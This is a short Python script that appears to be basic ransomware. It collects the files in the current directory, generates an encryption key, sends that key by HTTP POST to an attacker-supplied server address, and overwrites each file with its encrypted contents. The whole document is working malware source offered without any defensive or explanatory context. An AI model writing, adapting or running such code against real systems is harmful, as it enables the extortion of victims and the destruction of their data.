import os
import requests
from cryptography.fernet import Fernet


SERVER_URL = "http://your ip:8080/upload"  


files = []
for file in os.listdir():
    if file in ["encrypt.py", "decrypt.py", "thekey.key"]:
        continue
    if os.path.isfile(file):
        files.append(file)

print("[+] Files to be encrypted:", files)


key = Fernet.generate_key()


try:
    response = requests.post(SERVER_URL, data={"key": key.decode()})
    if response.status_code == 200:
        print("[+] Key sent successfully to server.")
    else:
        print("[-] Failed to send key. Server response:", response.status_code)
except Exception as e:
    print("[-] Error sending key:", e)


for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("[+] All files encrypted.")

